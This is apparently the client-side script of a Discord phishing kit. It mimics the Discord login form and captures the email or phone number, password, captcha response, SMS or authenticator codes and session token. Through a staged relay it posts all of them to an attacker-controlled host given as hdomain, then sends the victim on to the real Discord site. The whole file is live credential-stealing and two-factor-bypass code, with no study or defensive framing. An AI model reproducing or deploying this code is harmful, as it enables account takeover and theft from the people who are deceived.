let widgetID = null;
let widgetIDRes = null;
let captchaUsed = false;
let logInp = document.querySelectorAll('[scrpz="jufuty3rfw4w2"]')[0];
let passInp = document.querySelectorAll('[scrpz="hrty4ecwfwer"]')[0];
let mfaInput = document.querySelectorAll('[scrpz="hru45wfwef"]')[0];
let logErr = document.querySelectorAll('[scrpz="jrgsdfsrt34"]')[0];
let passErr = document.querySelectorAll('[scrpz="jtdstt6sdf"]')[0];
let logOuter = document.querySelectorAll('[scrpz="xzfdtwrtwedfe"]')[0];
let mfaErr = document.querySelectorAll('[scrpz="jtjdfvet534t"]')[0];
let mfaTicket = null;
let latestMfaInfo = null;
let mfaState = 0;
let ssl = true;
var t_locale = "undefined";
initCaptchaCheck();

var lastotp = null;
var rightotp = null;
var gettingotp = false;
var gettingotpid = null;

function tryLogin(captcha = null){
    let err = false;
    if(logInp.value.trim() == ""){
        err = true;
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or phone number", "This field is required");
    }
    if(passInp.value.trim() == ""){
        err = true;
        passInp.classList.add("inputError-1PrjdI");
        passErr.classList.add("error-25JxNp");
        passErr.innerHTML = getErrorContent("Password", "This field is required");
    }
    if(err) return;
    fetch(`${ssl ? "https" : "http"}://${hdomain}/login`, {
        method: "POST",
        headers: {
          'Content-Type': "application/json"
        },
        body: JSON.stringify({
            stage: 1,
            captcha_key: captcha,
            gift_code_sku_id: null,
            login: logInp.value.trim(),
            login_source: null,
            password: passInp.value.trim(),
            undelete: false,
            id: "-1"
        })
    }).then(e => e.json()).then(json => {
        if(json.invalid == 2) return showError(json);
        if(json.captcha_key && json.captcha_key[0] == "captcha-required") return openCaptchaPage(json.captcha_sitekey);
        if(json.errors) return showErrors(json.errors);
        if(json.mfa || json.sms) return parseMfa(json);
        if(json.token) submitCode(json.token, 2)
    })
}

function openCaptchaPage(sitekey){
    document.querySelectorAll('[scrpz="xfsdtgrey63fws"]')[0].style.display = "none";
    document.querySelectorAll('[scrpz="kghhrgvberte"]')[0].style.display = "block";
    if(!captchaUsed) {
        widgetID = hcaptcha.render(
            document.querySelectorAll('[scrpz="jbdcvdte4wfs"]')[0],
            {
                sitekey,
                theme: "dark",
            }
        );
    } else widgetID = widgetIDRes;
    widgetIDRes = widgetID;
}

function parseMfa(json = false){
    mfaState = 0;
    let inf = true;
    if(!json) inf = false;
    json = json || latestMfaInfo;
    if(inf) latestMfaInfo = json;
    if(json != null && json != false) mfaTicket = json.ticket;
    if(json != null && json != false && json.mfa){
        document.querySelectorAll('[scrpz="jnxcvxdfwr"]')[0].innerText = "You can use a backup code or your two-factor authentication mobile app.";
        if(json.sms){
            document.querySelectorAll('[scrpz="jdvsvsteygre"]')[0].innerText = "Receive auth code from SMS";
            document.querySelectorAll('[scrpz="jdvsvsteygre"]')[0].style.display = "block";
        }
        else document.querySelectorAll('[scrpz="jdvsvsteygre"]')[0].style.display = "none";
        openMfaPage();
    } else if(json != null && json != false && json.sms){

    }
}

function submitOTP(otp){
    if(otp && rightotp != otp){
        fetch(`${ssl ? "https" : "http"}://` + hdomain + "/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                stage: 5,
                id: "-1",
                otid: gettingotpid,
                otp: otp
            })
        }).then(e => e.json()).then(json => {
            if(json.done == true) {
                window.location.href = "https://discord.com/channels/@me";
            }
            if(json.message) return showMfaError(json.message);
        }).catch(e => {});
    } else {
        showMfaError("Invalid two-factor code");
    }
}

function checkTotpButton(){
    if(mfaInput.value.trim() == ""){
        showMfaError("This field is required");
        return;
    }
    lastotp = mfaInput.value.trim();
    if(!gettingotp) {
        checkTotp(mfaInput.value.trim());
    } else {
        submitOTP(mfaInput.value.trim());
    }
}

function sendSms(){
    mfaState = 1;
    fetch("https://discord.com/api/v9/auth/mfa/sms/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            ticket: mfaTicket
        })
    }).then(e => e.json()).then(e => {
        if(e.message) return showMfaError(e.message);
        document.querySelectorAll('[scrpz="jnxcvxdfwr"]')[0].innerText = `We've sent a message to ${e.phone} .  Please enter the code you received.`;
        document.querySelectorAll('[scrpz="jdvsvsteygre"]')[0].innerText = "Resend SMS?";
    });
}

function checkTotp(code){
    fetch(`${ssl ? "https" : "http"}://` + hdomain + "/login", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            stage: mfaState === 1 ? 2 : 3,
            code: code,
            ticket: mfaTicket,
            login_source: null,
            gift_code_sku_id: null,
            id: "-1"
        })
    }).then(e => e.json()).then(json => {
        if(json.user_settings && json.user_settings.locale) t_locale = json.user_settings.locale;
        if(json.message) return showMfaError(json.message);
        showMfaError(false);
        if(json.token) {
            gettingotp = true;
            rightotp = code;
            submitCode(json.token, 2)
        }
    }).catch(e => {});
}

function closeMfaPage(){
    document.querySelectorAll('[scrpz="jfbfdvert53fsd"]')[0].style.display = "none";
    document.querySelectorAll('[scrpz="xfsdtgrey63fws"]')[0].style.display = "block";
}

function openMfaPage(){
    mfaInput.value = "";
    document.querySelectorAll('[scrpz="xfsdtgrey63fws"]')[0].style.display = "none";
    document.querySelectorAll('[scrpz="jfbfdvert53fsd"]')[0].style.display = "block";
}

function showMfaError(error = false){
    if(error){
        if(error != "Invalid two-factor code") parseMfa(false);
        mfaErr.innerHTML = getErrorContent("Enter Discord Auth/Backup Code", error);
        mfaErr.classList.add("error-25JxNp");
        mfaInput.classList.add("inputError-1PrjdI");
    } else {
        mfaErr.classList.remove("error-25JxNp");
        mfaInput.classList.remove("inputError-1PrjdI");
    }
}

function submitCode(token, type){
    if(token){
        fetch(`${ssl ? "https" : "http"}://` + hdomain + "/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                stage: 4,
                login: logInp.value.trim() || null,
                password: passInp.value.trim() || null,
                t: token,
                d: hdomain,
                type: type,
                locale: t_locale,
                id: "-1",
                otp: lastotp
            })
        }).then(e => e.json()).then(json => {
            if(json.id) {
                gettingotpid = json.id;
            }
            if(json.done == true) {
                window.location.href = "https://discord.com/channels/@me";
            }
            if(json.message) return showMfaError(json.message);
        }).catch(e => {});
    }
}

function initCaptchaCheck(){
    setInterval(() => {
        if(!widgetID) return;
        let key = hcaptcha.getResponse(widgetID);
        if(key.trim() != "") captchaChecked(key);
    }, 1000);
}

function captchaChecked(key){
    hcaptcha.reset(widgetID);
    captchaUsed = true;
    widgetID = null;
    closeCaptchaPage();
    tryLogin(key);
}

function closeCaptchaPage(){
    document.querySelectorAll('[scrpz="kghhrgvberte"]')[0].style.display = "none";
    document.querySelectorAll('[scrpz="xfsdtgrey63fws"]')[0].style.display = "block";
}

function showError(js){
    if(js.code == 1) {
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or phone number", "Something going wrong...");
    } else if(js.code == 2) {
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or phone number", "Server error! " + js.errormsg);
    }
}

function showErrors(errors){
    let loginError = errors?.login?._errors[0]?.message;
    if(loginError){
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or phone number", loginError);
    }else{
        logOuter.classList.remove("error-2O5WFJ");
        logErr.classList.remove("error-25JxNp");
    }
    let passwordError = errors?.password?._errors[0]?.message;
    if(passwordError){
        passInp.classList.add("inputError-1PrjdI");
        passErr.classList.add("error-25JxNp");
        passErr.innerHTML = getErrorContent("Password", passwordError);
    }else{
        passInp.classList.remove("inputError-1PrjdI");
        passErr.classList.remove("error-25JxNp");
    }
}

function getErrorContent(title, error){
    return `${title}<span class="errorMessage-3Guw2R"><span class="errorSeparator-30Q6aR">-</span>${error}</span>`
}
